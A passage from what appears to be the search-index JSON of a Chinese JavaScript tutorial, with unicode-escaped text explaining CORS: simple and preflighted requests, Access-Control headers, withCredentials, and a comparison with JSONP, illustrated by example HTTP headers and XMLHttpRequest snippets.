\u8bf7\u6c42\u5206\u6210\u4e24\u7c7b\uff1a\u7b80\u5355\u8bf7\u6c42\uff08simple request\uff09\u548c\u975e\u7b80\u5355\u8bf7\u6c42\uff08not-so-simple request\uff09\u3002 \u53ea\u8981\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u4e24\u5927\u6761\u4ef6\uff0c\u5c31\u5c5e\u4e8e\u7b80\u5355\u8bf7\u6c42\u3002 \uff081\uff09\u8bf7\u6c42\u65b9\u6cd5\u662f\u4ee5\u4e0b\u4e09\u79cd\u65b9\u6cd5\u4e4b\u4e00\u3002 HEAD GET POST \uff082\uff09HTTP \u7684\u5934\u4fe1\u606f\u4e0d\u8d85\u51fa\u4ee5\u4e0b\u51e0\u79cd\u5b57\u6bb5\u3002 Accept Accept-Language Content-Language Last-Event-ID Content-Type\uff1a\u53ea\u9650\u4e8e\u4e09\u4e2a\u503c application/x-www-form-urlencoded \u3001 multipart/form-data \u3001 text/plain \u51e1\u662f\u4e0d\u540c\u65f6\u6ee1\u8db3\u4e0a\u9762\u4e24\u4e2a\u6761\u4ef6\uff0c\u5c31\u5c5e\u4e8e\u975e\u7b80\u5355\u8bf7\u6c42\u3002\u4e00\u53e5\u8bdd\uff0c\u7b80\u5355\u8bf7\u6c42\u5c31\u662f\u7b80\u5355\u7684 HTTP \u65b9\u6cd5\u4e0e\u7b80\u5355\u7684 HTTP \u5934\u4fe1\u606f\u7684\u7ed3\u5408\u3002 \u8fd9\u6837\u5212\u5206\u7684\u539f\u56e0\u662f\uff0c\u8868\u5355\u5728\u5386\u53f2\u4e0a\u4e00\u76f4\u53ef\u4ee5\u8de8\u57df\u53d1\u51fa\u8bf7\u6c42\u3002\u7b80\u5355\u8bf7\u6c42\u5c31\u662f\u8868\u5355\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u6cbf\u88ad\u4e86\u4f20\u7edf\u7684\u5904\u7406\u65b9\u5f0f\uff0c\u4e0d\u628a\u884c\u4e3a\u590d\u6742\u5316\uff0c\u5426\u5219\u5f00\u53d1\u8005\u53ef\u80fd\u8f6c\u800c\u4f7f\u7528\u8868\u5355\uff0c\u89c4\u907f CORS \u7684\u9650\u5236\u3002\u5bf9\u4e8e\u975e\u7b80\u5355\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u4f1a\u91c7\u7528\u65b0\u7684\u5904\u7406\u65b9\u5f0f\u3002 \u7b80\u5355\u8bf7\u6c42 \u00b6 \u57fa\u672c\u6d41\u7a0b \u00b6 \u5bf9\u4e8e\u7b80\u5355\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u76f4\u63a5\u53d1\u51fa CORS \u8bf7\u6c42\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c31\u662f\u5728\u5934\u4fe1\u606f\u4e4b\u4e2d\uff0c\u589e\u52a0\u4e00\u4e2a Origin \u5b57\u6bb5\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6d4f\u89c8\u5668\u53d1\u73b0\u8fd9\u6b21\u8de8\u57df AJAX \u8bf7\u6c42\u662f\u7b80\u5355\u8bf7\u6c42\uff0c\u5c31\u81ea\u52a8\u5728\u5934\u4fe1\u606f\u4e4b\u4e2d\uff0c\u6dfb\u52a0\u4e00\u4e2a Origin \u5b57\u6bb5\u3002 1 2 3 4 5 6 GET /cors HTTP / 1.1 Origin : http://api.bob.com Host : api.alice.com Accept-Language : en-US Connection : keep-alive User-Agent : Mozilla/5.0... \u4e0a\u9762\u7684\u5934\u4fe1\u606f\u4e2d\uff0c Origin \u5b57\u6bb5\u7528\u6765\u8bf4\u660e\uff0c\u672c\u6b21\u8bf7\u6c42\u6765\u81ea\u54ea\u4e2a\u57df\uff08\u534f\u8bae + \u57df\u540d + \u7aef\u53e3\uff09\u3002\u670d\u52a1\u5668\u6839\u636e\u8fd9\u4e2a\u503c\uff0c\u51b3\u5b9a\u662f\u5426\u540c\u610f\u8fd9\u6b21\u8bf7\u6c42\u3002 \u5982\u679c Origin \u6307\u5b9a\u7684\u6e90\uff0c\u4e0d\u5728\u8bb8\u53ef\u8303\u56f4\u5185\uff0c\u670d\u52a1\u5668\u4f1a\u8fd4\u56de\u4e00\u4e2a\u6b63\u5e38\u7684 HTTP \u56de\u5e94\u3002\u6d4f\u89c8\u5668\u53d1\u73b0\uff0c\u8fd9\u4e2a\u56de\u5e94\u7684\u5934\u4fe1\u606f\u6ca1\u6709\u5305\u542b Access-Control-Allow-Origin \u5b57\u6bb5\uff08\u8be6\u89c1\u4e0b\u6587\uff09\uff0c\u5c31\u77e5\u9053\u51fa\u9519\u4e86\uff0c\u4ece\u800c\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u88ab XMLHttpRequest \u7684 onerror \u56de\u8c03\u51fd\u6570\u6355\u83b7\u3002\u6ce8\u610f\uff0c\u8fd9\u79cd\u9519\u8bef\u65e0\u6cd5\u901a\u8fc7\u72b6\u6001\u7801\u8bc6\u522b\uff0c\u56e0\u4e3a HTTP \u56de\u5e94\u7684\u72b6\u6001\u7801\u6709\u53ef\u80fd\u662f200\u3002 \u5982\u679c Origin \u6307\u5b9a\u7684\u57df\u540d\u5728\u8bb8\u53ef\u8303\u56f4\u5185\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u54cd\u5e94\uff0c\u4f1a\u591a\u51fa\u51e0\u4e2a\u5934\u4fe1\u606f\u5b57\u6bb5\u3002 1 2 3 4 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 \u4e0a\u9762\u7684\u5934\u4fe1\u606f\u4e4b\u4e2d\uff0c\u6709\u4e09\u4e2a\u4e0e CORS \u8bf7\u6c42\u76f8\u5173\u7684\u5b57\u6bb5\uff0c\u90fd\u4ee5 Access-Control- \u5f00\u5934\u3002 \uff081\uff09 Access-Control-Allow-Origin \u8be5\u5b57\u6bb5\u662f\u5fc5\u987b\u7684\u3002\u5b83\u7684\u503c\u8981\u4e48\u662f\u8bf7\u6c42\u65f6 Origin \u5b57\u6bb5\u7684\u503c\uff0c\u8981\u4e48\u662f\u4e00\u4e2a * \uff0c\u8868\u793a\u63a5\u53d7\u4efb\u610f\u57df\u540d\u7684\u8bf7\u6c42\u3002 \uff082\uff09 Access-Control-Allow-Credentials \u8be5\u5b57\u6bb5\u53ef\u9009\u3002\u5b83\u7684\u503c\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5141\u8bb8\u53d1\u9001 Cookie\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cCookie \u4e0d\u5305\u62ec\u5728 CORS \u8bf7\u6c42\u4e4b\u4e2d\u3002\u8bbe\u4e3a true \uff0c\u5373\u8868\u793a\u670d\u52a1\u5668\u660e\u786e\u8bb8\u53ef\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u628a Cookie \u5305\u542b\u5728\u8bf7\u6c42\u4e2d\uff0c\u4e00\u8d77\u53d1\u7ed9\u670d\u52a1\u5668\u3002\u8fd9\u4e2a\u503c\u4e5f\u53ea\u80fd\u8bbe\u4e3a true \uff0c\u5982\u679c\u670d\u52a1\u5668\u4e0d\u8981\u6d4f\u89c8\u5668\u53d1\u9001 Cookie\uff0c\u4e0d\u53d1\u9001\u8be5\u5b57\u6bb5\u5373\u53ef\u3002 \uff083\uff09 Access-Control-Expose-Headers \u8be5\u5b57\u6bb5\u53ef\u9009\u3002CORS \u8bf7\u6c42\u65f6\uff0c XMLHttpRequest \u5bf9\u8c61\u7684 getResponseHeader() \u65b9\u6cd5\u53ea\u80fd\u62ff\u52306\u4e2a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u57fa\u672c\u5b57\u6bb5\uff1a Cache-Control \u3001 Content-Language \u3001 Content-Type \u3001 Expires \u3001 Last-Modified \u3001 Pragma \u3002\u5982\u679c\u60f3\u62ff\u5230\u5176\u4ed6\u5b57\u6bb5\uff0c\u5c31\u5fc5\u987b\u5728 Access-Control-Expose-Headers \u91cc\u9762\u6307\u5b9a\u3002\u4e0a\u9762\u7684\u4f8b\u5b50\u6307\u5b9a\uff0c getResponseHeader('FooBar') \u53ef\u4ee5\u8fd4\u56de FooBar \u5b57\u6bb5\u7684\u503c\u3002 withCredentials \u5c5e\u6027 \u00b6 \u4e0a\u9762\u8bf4\u5230\uff0cCORS \u8bf7\u6c42\u9ed8\u8ba4\u4e0d\u5305\u542b Cookie \u4fe1\u606f\uff08\u4ee5\u53ca HTTP \u8ba4\u8bc1\u4fe1\u606f\u7b49\uff09\uff0c\u8fd9\u662f\u4e3a\u4e86\u964d\u4f4e CSRF \u653b\u51fb\u7684\u98ce\u9669\u3002\u4f46\u662f\u67d0\u4e9b\u573a\u5408\uff0c\u670d\u52a1\u5668\u53ef\u80fd\u9700\u8981\u62ff\u5230 Cookie\uff0c\u8fd9\u65f6\u9700\u8981\u670d\u52a1\u5668\u663e\u5f0f\u6307\u5b9a Access-Control-Allow-Credentials \u5b57\u6bb5\uff0c\u544a\u8bc9\u6d4f\u89c8\u5668\u53ef\u4ee5\u53d1\u9001 Cookie\u3002 1 Access-Control-Allow-Credentials: true \u540c\u65f6\uff0c\u5f00\u53d1\u8005\u5fc5\u987b\u5728 AJAX \u8bf7\u6c42\u4e2d\u6253\u5f00 withCredentials \u5c5e\u6027\u3002 1 2 var xhr = new XMLHttpRequest (); xhr . withCredentials = true ; \u5426\u5219\uff0c\u5373\u4f7f\u670d\u52a1\u5668\u8981\u6c42\u53d1\u9001 Cookie\uff0c\u6d4f\u89c8\u5668\u4e5f\u4e0d\u4f1a\u53d1\u9001\u3002\u6216\u8005\uff0c\u670d\u52a1\u5668\u8981\u6c42\u8bbe\u7f6e Cookie\uff0c\u6d4f\u89c8\u5668\u4e5f\u4e0d\u4f1a\u5904\u7406\u3002 \u4f46\u662f\uff0c\u6709\u7684\u6d4f\u89c8\u5668\u9ed8\u8ba4\u5c06 withCredentials \u5c5e\u6027\u8bbe\u4e3a true \u3002\u8fd9\u5bfc\u81f4\u5982\u679c\u7701\u7565 withCredentials \u8bbe\u7f6e\uff0c\u8fd9\u4e9b\u6d4f\u89c8\u5668\u53ef\u80fd\u8fd8\u662f\u4f1a\u4e00\u8d77\u53d1\u9001 Cookie\u3002\u8fd9\u65f6\uff0c\u53ef\u4ee5\u663e\u5f0f\u5173\u95ed withCredentials \u3002 1 xhr . withCredentials = false ; \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u670d\u52a1\u5668\u8981\u6c42\u6d4f\u89c8\u5668\u53d1\u9001 Cookie\uff0c Access-Control-Allow-Origin \u5c31\u4e0d\u80fd\u8bbe\u4e3a\u661f\u53f7\uff0c\u5fc5\u987b\u6307\u5b9a\u660e\u786e\u7684\u3001\u4e0e\u8bf7\u6c42\u7f51\u9875\u4e00\u81f4\u7684\u57df\u540d\u3002\u540c\u65f6\uff0cCookie \u4f9d\u7136\u9075\u5faa\u540c\u6e90\u653f\u7b56\uff0c\u53ea\u6709\u7528\u670d\u52a1\u5668\u57df\u540d\u8bbe\u7f6e\u7684 Cookie \u624d\u4f1a\u4e0a\u4f20\uff0c\u5176\u4ed6\u57df\u540d\u7684 Cookie \u5e76\u4e0d\u4f1a\u4e0a\u4f20\uff0c\u4e14\uff08\u8de8\u57df\uff09\u539f\u7f51\u9875\u4ee3\u7801\u4e2d\u7684 document.cookie \u4e5f\u65e0\u6cd5\u8bfb\u53d6\u670d\u52a1\u5668\u57df\u540d\u4e0b\u7684 Cookie\u3002 \u975e\u7b80\u5355\u8bf7\u6c42 \u00b6 \u9884\u68c0\u8bf7\u6c42 \u00b6 \u975e\u7b80\u5355\u8bf7\u6c42\u662f\u90a3\u79cd\u5bf9\u670d\u52a1\u5668\u63d0\u51fa\u7279\u6b8a\u8981\u6c42\u7684\u8bf7\u6c42\uff0c\u6bd4\u5982\u8bf7\u6c42\u65b9\u6cd5\u662f PUT \u6216 DELETE \uff0c\u6216\u8005 Content-Type \u5b57\u6bb5\u7684\u7c7b\u578b\u662f application/json \u3002 \u975e\u7b80\u5355\u8bf7\u6c42\u7684 CORS \u8bf7\u6c42\uff0c\u4f1a\u5728\u6b63\u5f0f\u901a\u4fe1\u4e4b\u524d\uff0c\u589e\u52a0\u4e00\u6b21 HTTP \u67e5\u8be2\u8bf7\u6c42\uff0c\u79f0\u4e3a\u201c\u9884\u68c0\u201d\u8bf7\u6c42\uff08preflight\uff09\u3002\u6d4f\u89c8\u5668\u5148\u8be2\u95ee\u670d\u52a1\u5668\uff0c\u5f53\u524d\u7f51\u9875\u6240\u5728\u7684\u57df\u540d\u662f\u5426\u5728\u670d\u52a1\u5668\u7684\u8bb8\u53ef\u540d\u5355\u4e4b\u4e2d\uff0c\u4ee5\u53ca\u53ef\u4ee5\u4f7f\u7528\u54ea\u4e9b HTTP \u65b9\u6cd5\u548c\u5934\u4fe1\u606f\u5b57\u6bb5\u3002\u53ea\u6709\u5f97\u5230\u80af\u5b9a\u7b54\u590d\uff0c\u6d4f\u89c8\u5668\u624d\u4f1a\u53d1\u51fa\u6b63\u5f0f\u7684 XMLHttpRequest \u8bf7\u6c42\uff0c\u5426\u5219\u5c31\u62a5\u9519\u3002\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u8fd9\u4e9b\u65b0\u589e\u7684\u8bf7\u6c42\uff0c\u5bf9\u4f20\u7edf\u7684\u6ca1\u6709 CORS \u652f\u6301\u7684\u670d\u52a1\u5668\u5f62\u6210\u538b\u529b\uff0c\u7ed9\u670d\u52a1\u5668\u4e00\u4e2a\u63d0\u524d\u62d2\u7edd\u7684\u673a\u4f1a\uff0c\u8fd9\u6837\u53ef\u4ee5\u9632\u6b62\u670d\u52a1\u5668\u6536\u5230\u5927\u91cf DELETE \u548c PUT \u8bf7\u6c42\uff0c\u8fd9\u4e9b\u4f20\u7edf\u7684\u8868\u5355\u4e0d\u53ef\u80fd\u8de8\u57df\u53d1\u51fa\u7684\u8bf7\u6c42\u3002 \u4e0b\u9762\u662f\u4e00\u6bb5\u6d4f\u89c8\u5668\u7684 JavaScript \u811a\u672c\u3002 1 2 3 4 5 var url = 'http://api.alice.com/cors' ; var xhr = new XMLHttpRequest (); xhr . open ( 'PUT' , url , true ); xhr . setRequestHeader ( 'X-Custom-Header' , 'value' ); xhr . send (); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cHTTP \u8bf7\u6c42\u7684\u65b9\u6cd5\u662f PUT \uff0c\u5e76\u4e14\u53d1\u9001\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5934\u4fe1\u606f X-Custom-Header \u3002 \u6d4f\u89c8\u5668\u53d1\u73b0\uff0c\u8fd9\u662f\u4e00\u4e2a\u975e\u7b80\u5355\u8bf7\u6c42\uff0c\u5c31\u81ea\u52a8\u53d1\u51fa\u4e00\u4e2a\u201c\u9884\u68c0\u201d\u8bf7\u6c42\uff0c\u8981\u6c42\u670d\u52a1\u5668\u786e\u8ba4\u53ef\u4ee5\u8fd9\u6837\u8bf7\u6c42\u3002\u4e0b\u9762\u662f\u8fd9\u4e2a\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u7684 HTTP \u5934\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 OPTIONS /cors HTTP / 1.1 Origin : http://api.bob.com Access-Control-Request-Method : PUT Access-Control-Request-Headers : X-Custom-Header Host : api.alice.com Accept-Language : en-US Connection : keep-alive User-Agent : Mozilla/5.0... \u201c\u9884\u68c0\u201d\u8bf7\u6c42\u7528\u7684\u8bf7\u6c42\u65b9\u6cd5\u662f OPTIONS \uff0c\u8868\u793a\u8fd9\u4e2a\u8bf7\u6c42\u662f\u7528\u6765\u8be2\u95ee\u7684\u3002\u5934\u4fe1\u606f\u91cc\u9762\uff0c\u5173\u952e\u5b57\u6bb5\u662f Origin \uff0c\u8868\u793a\u8bf7\u6c42\u6765\u81ea\u54ea\u4e2a\u6e90\u3002 \u9664\u4e86 Origin \u5b57\u6bb5\uff0c\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u7684\u5934\u4fe1\u606f\u5305\u62ec\u4e24\u4e2a\u7279\u6b8a\u5b57\u6bb5\u3002 \uff081\uff09 Access-Control-Request-Method \u8be5\u5b57\u6bb5\u662f\u5fc5\u987b\u7684\uff0c\u7528\u6765\u5217\u51fa\u6d4f\u89c8\u5668\u7684 CORS \u8bf7\u6c42\u4f1a\u7528\u5230\u54ea\u4e9b HTTP \u65b9\u6cd5\uff0c\u4e0a\u4f8b\u662f PUT \u3002 \uff082\uff09 Access-Control-Request-Headers \u8be5\u5b57\u6bb5\u662f\u4e00\u4e2a\u9017\u53f7\u5206\u9694\u7684\u5b57\u7b26\u4e32\uff0c\u6307\u5b9a\u6d4f\u89c8\u5668 CORS \u8bf7\u6c42\u4f1a\u989d\u5916\u53d1\u9001\u7684\u5934\u4fe1\u606f\u5b57\u6bb5\uff0c\u4e0a\u4f8b\u662f X-Custom-Header \u3002 \u9884\u68c0\u8bf7\u6c42\u7684\u56de\u5e94 \u00b6 \u670d\u52a1\u5668\u6536\u5230\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u4ee5\u540e\uff0c\u68c0\u67e5\u4e86 Origin \u3001 Access-Control-Request-Method \u548c Access-Control-Request-Headers \u5b57\u6bb5\u4ee5\u540e\uff0c\u786e\u8ba4\u5141\u8bb8\u8de8\u6e90\u8bf7\u6c42\uff0c\u5c31\u53ef\u4ee5\u505a\u51fa\u56de\u5e94\u3002 1 2 3 4 5 6 7 8 9 10 11 12 HTTP / 1.1 200 OK Date : Mon, 01 Dec 2008 01:15:39 GMT Server : Apache/2.0.61 (Unix) Access-Control-Allow-Origin : http://api.bob.com Access-Control-Allow-Methods : GET, POST, PUT Access-Control-Allow-Headers : X-Custom-Header Content-Type : text/html; charset=utf-8 Content-Encoding : gzip Content-Length : 0 Keep-Alive : timeout=2, max=100 Connection : Keep-Alive Content-Type : text/plain \u4e0a\u9762\u7684 HTTP \u56de\u5e94\u4e2d\uff0c\u5173\u952e\u7684\u662f Access-Control-Allow-Origin \u5b57\u6bb5\uff0c\u8868\u793a http://api.bob.com \u53ef\u4ee5\u8bf7\u6c42\u6570\u636e\u3002\u8be5\u5b57\u6bb5\u4e5f\u53ef\u4ee5\u8bbe\u4e3a\u661f\u53f7\uff0c\u8868\u793a\u540c\u610f\u4efb\u610f\u8de8\u6e90\u8bf7\u6c42\u3002 1 Access-Control-Allow-Origin: * \u5982\u679c\u670d\u52a1\u5668\u5426\u5b9a\u4e86\u201c\u9884\u68c0\u201d\u8bf7\u6c42\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u6b63\u5e38\u7684 HTTP \u56de\u5e94\uff0c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55 CORS \u76f8\u5173\u7684\u5934\u4fe1\u606f\u5b57\u6bb5\uff0c\u6216\u8005\u660e\u786e\u8868\u793a\u8bf7\u6c42\u4e0d\u7b26\u5408\u6761\u4ef6\u3002 1 2 3 4 OPTIONS http://api.bob.com HTTP / 1.1 Status : 200 Access-Control-Allow-Origin : https://notyourdomain.com Access-Control-Allow-Method : POST \u4e0a\u9762\u7684\u670d\u52a1\u5668\u56de\u5e94\uff0c Access-Control-Allow-Origin \u5b57\u6bb5\u660e\u786e\u4e0d\u5305\u62ec\u53d1\u51fa\u8bf7\u6c42\u7684 http://api.bob.com \u3002 \u8fd9\u65f6\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u8ba4\u5b9a\uff0c\u670d\u52a1\u5668\u4e0d\u540c\u610f\u9884\u68c0\u8bf7\u6c42\uff0c\u56e0\u6b64\u89e6\u53d1\u4e00\u4e2a\u9519\u8bef\uff0c\u88ab XMLHttpRequest \u5bf9\u8c61\u7684 onerror \u56de\u8c03\u51fd\u6570\u6355\u83b7\u3002\u63a7\u5236\u53f0\u4f1a\u6253\u5370\u51fa\u5982\u4e0b\u7684\u62a5\u9519\u4fe1\u606f\u3002 1 2 XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. \u670d\u52a1\u5668\u56de\u5e94\u7684\u5176\u4ed6 CORS \u76f8\u5173\u5b57\u6bb5\u5982\u4e0b\u3002 1 2 3 4 Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 \uff081\uff09 Access-Control-Allow-Methods \u8be5\u5b57\u6bb5\u5fc5\u9700\uff0c\u5b83\u7684\u503c\u662f\u9017\u53f7\u5206\u9694\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u660e\u670d\u52a1\u5668\u652f\u6301\u7684\u6240\u6709\u8de8\u57df\u8bf7\u6c42\u7684\u65b9\u6cd5\u3002\u6ce8\u610f\uff0c\u8fd4\u56de\u7684\u662f\u6240\u6709\u652f\u6301\u7684\u65b9\u6cd5\uff0c\u800c\u4e0d\u5355\u662f\u6d4f\u89c8\u5668\u8bf7\u6c42\u7684\u90a3\u4e2a\u65b9\u6cd5\u3002\u8fd9\u662f\u4e3a\u4e86\u907f\u514d\u591a\u6b21\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u3002 \uff082\uff09 Access-Control-Allow-Headers \u5982\u679c\u6d4f\u89c8\u5668\u8bf7\u6c42\u5305\u62ec Access-Control-Request-Headers \u5b57\u6bb5\uff0c\u5219 Access-Control-Allow-Headers \u5b57\u6bb5\u662f\u5fc5\u9700\u7684\u3002\u5b83\u4e5f\u662f\u4e00\u4e2a\u9017\u53f7\u5206\u9694\u7684\u5b57\u7b26\u4e32\uff0c\u8868\u660e\u670d\u52a1\u5668\u652f\u6301\u7684\u6240\u6709\u5934\u4fe1\u606f\u5b57\u6bb5\uff0c\u4e0d\u9650\u4e8e\u6d4f\u89c8\u5668\u5728\u201c\u9884\u68c0\u201d\u4e2d\u8bf7\u6c42\u7684\u5b57\u6bb5\u3002 \uff083\uff09 Access-Control-Allow-Credentials \u8be5\u5b57\u6bb5\u4e0e\u7b80\u5355\u8bf7\u6c42\u65f6\u7684\u542b\u4e49\u76f8\u540c\u3002 \uff084\uff09 Access-Control-Max-Age \u8be5\u5b57\u6bb5\u53ef\u9009\uff0c\u7528\u6765\u6307\u5b9a\u672c\u6b21\u9884\u68c0\u8bf7\u6c42\u7684\u6709\u6548\u671f\uff0c\u5355\u4f4d\u4e3a\u79d2\u3002\u4e0a\u9762\u7ed3\u679c\u4e2d\uff0c\u6709\u6548\u671f\u662f20\u5929\uff081728000\u79d2\uff09\uff0c\u5373\u5141\u8bb8\u7f13\u5b58\u8be5\u6761\u56de\u5e941728000\u79d2\uff08\u537320\u5929\uff09\uff0c\u5728\u6b64\u671f\u95f4\uff0c\u4e0d\u7528\u53d1\u51fa\u53e6\u4e00\u6761\u9884\u68c0\u8bf7\u6c42\u3002 \u6d4f\u89c8\u5668\u7684\u6b63\u5e38\u8bf7\u6c42\u548c\u56de\u5e94 \u00b6 \u4e00\u65e6\u670d\u52a1\u5668\u901a\u8fc7\u4e86\u201c\u9884\u68c0\u201d\u8bf7\u6c42\uff0c\u4ee5\u540e\u6bcf\u6b21\u6d4f\u89c8\u5668\u6b63\u5e38\u7684 CORS \u8bf7\u6c42\uff0c\u5c31\u90fd\u8ddf\u7b80\u5355\u8bf7\u6c42\u4e00\u6837\uff0c\u4f1a\u6709\u4e00\u4e2a Origin \u5934\u4fe1\u606f\u5b57\u6bb5\u3002\u670d\u52a1\u5668\u7684\u56de\u5e94\uff0c\u4e5f\u90fd\u4f1a\u6709\u4e00\u4e2a Access-Control-Allow-Origin \u5934\u4fe1\u606f\u5b57\u6bb5\u3002 \u4e0b\u9762\u662f\u201c\u9884\u68c0\u201d\u8bf7\u6c42\u4e4b\u540e\uff0c\u6d4f\u89c8\u5668\u7684\u6b63\u5e38 CORS \u8bf7\u6c42\u3002 1 2 3 4 5 6 7 PUT /cors HTTP / 1.1 Origin : http://api.bob.com Host : api.alice.com X-Custom-Header : value Accept-Language : en-US Connection : keep-alive User-Agent : Mozilla/5.0... \u4e0a\u9762\u5934\u4fe1\u606f\u7684 Origin \u5b57\u6bb5\u662f\u6d4f\u89c8\u5668\u81ea\u52a8\u6dfb\u52a0\u7684\u3002 \u4e0b\u9762\u662f\u670d\u52a1\u5668\u6b63\u5e38\u7684\u56de\u5e94\u3002 1 2 Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 \u4e0a\u9762\u5934\u4fe1\u606f\u4e2d\uff0c Access-Control-Allow-Origin \u5b57\u6bb5\u662f\u6bcf\u6b21\u56de\u5e94\u90fd\u5fc5\u5b9a\u5305\u542b\u7684\u3002 \u4e0e JSONP \u7684\u6bd4\u8f83 \u00b6 CORS \u4e0e JSONP \u7684\u4f7f\u7528\u76ee\u7684\u76f8\u540c\uff0c\u4f46\u662f\u6bd4 JSONP \u66f4\u5f3a\u5927\u3002JSONP \u53ea\u652f\u6301 GET \u8bf7\u6c42\uff0cCORS \u652f\u6301\u6240\u6709\u7c7b\u578b\u7684 HTTP \u8bf7\u6c42\u3002JSONP \u7684\u4f18\u52bf\u5728\u4e8e\u652f\u6301\u8001\u5f0f\u6d4f\u89c8\u5668\uff0c\u4ee5\u53ca\u53ef\u4ee5\u5411\u4e0d\u652f\u6301 CORS \u7684\u7f51\u7ad9\u8bf7\u6c42\u6570\u636e\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Using CORS , Monsur Hossain HTTP access control (CORS) , MDN CORS , Ryan Miller Do You Really Know CORS? , Grzegorz Mirek","title":"CORS \u901a\u4fe1"},{"location":"bom/cors/#cors","text":"CORS \u662f\u4e00\u4e2a W3C \u6807\u51c6\uff0c\u5168\u79f0\u662f\u201c\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u201d\uff08Cross-origin resource sharing\uff09\u3002\u5b83\u5141\u8bb8\u6d4f\u89c8\u5668\u5411\u8de8\u57df\u7684\u670d\u52a1\u5668\uff0c\u53d1\u51fa XMLHttpRequest \u8bf7\u6c42\uff0c\u4ece\u800c\u514b\u670d\u4e86 AJAX \u53ea\u80fd\u540c\u6e90\u4f7f\u7528\u7684\u9650\u5236\u3002","title":"CORS \u901a\u4fe1"},{"location":"bom/cors/#_1","text":"CORS \u9700\u8981\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u540c\u65f6\u652f\u6301\u3002\u76ee\u524d\uff0c\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u8be5\u529f\u80fd\u3002 \u6574\u4e2a CORS \u901a\u4fe1\u8fc7\u7a0b\uff0c\u90fd\u662f\u6d4f\u89c8\u5668\u81ea\u52a8\u5b8c\u6210\uff0c\u4e0d\u9700\u8981\u7528\u6237\u53c2\u4e0e\u3002\u5bf9\u4e8e\u5f00\u53d1\u8005\u6765\u8bf4\uff0cCORS \u901a\u4fe1\u4e0e\u666e\u901a\u7684 AJAX \u901a\u4fe1\u6ca1\u6709\u5dee\u522b\uff0c\u4ee3\u7801\u5b8c\u5168\u4e00\u6837\u3002\u6d4f\u89c8\u5668\u4e00\u65e6\u53d1\u73b0 AJAX \u8bf7\u6c42\u8de8\u57df\uff0c\u5c31\u4f1a\u81ea\u52a8\u6dfb\u52a0\u4e00\u4e9b\u9644\u52a0\u7684\u5934\u4fe1\u606f\uff0c\u6709\u65f6\u8fd8\u4f1a\u591a\u51fa\u4e00\u6b21\u9644\u52a0\u7684\u8bf7\u6c42\uff0c\u4f46\u7528\u6237\u4e0d\u4f1a\u6709\u611f\u77e5\u3002\u56e0\u6b64\uff0c\u5b9e\u73b0 CORS \u901a\u4fe1\u7684\u5173\u952e\u662f\u670d\u52a1\u5668\u3002\u53ea\u8981\u670d\u52a1\u5668\u5b9e\u73b0\u4e86 CORS \u63a5\u53e3\uff0c\u5c31\u53ef\u4ee5\u8de8\u57df\u901a\u4fe1\u3002","title":"\u7b80\u4ecb"},{"location":"bom/cors/#_2","text":"CORS \u8bf7\u6c42\u5206\u6210\u4e24\u7c7b\uff1a\u7b80\u5355\u8bf7\u6c42\uff08simple request\uff09\u548c\u975e\u7b80\u5355\u8bf7\u6c42\uff08not-so-simple request\uff09\u3002 \u53ea\u8981\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u4e24\u5927\u6761\u4ef6\uff0c\u5c31\u5c5e\u4e8e\u7b80\u5355\u8bf7\u6c42\u3002 \uff081\uff09\u8bf7\u6c42\u65b9\u6cd5\u662f\u4ee5\u4e0b\u4e09\u79cd\u65b9\u6cd5\u4e4b\u4e00\u3002 HEAD GET POST \uff082\uff09HTTP \u7684\u5934\u4fe1\u606f\u4e0d\u8d85\u51fa\u4ee5\u4e0b\u51e0\u79cd\u5b57\u6bb5\u3002 Accept Accept-Language Content-Language Last-Event-ID Content-Type\uff1a\u53ea\u9650\u4e8e\u4e09\u4e2a\u503c application/x-www-form-urlencoded \u3001 multipart/form-data \u3001 text/plain \u51e1\u662f\u4e0d\u540c\u65f6\u6ee1\u8db3\u4e0a\u9762\u4e24\u4e2a\u6761\u4ef6\uff0c\u5c31\u5c5e\u4e8e\u975e\u7b80\u5355\u8bf7\u6c42\u3002\u4e00\u53e5\u8bdd\uff0c\u7b80\u5355\u8bf7\u6c42\u5c31\u662f\u7b80\u5355\u7684 HTTP \u65b9\u6cd5\u4e0e\u7b80\u5355\u7684 HTTP \u5934\u4fe1\u606f\u7684\u7ed3\u5408\u3002 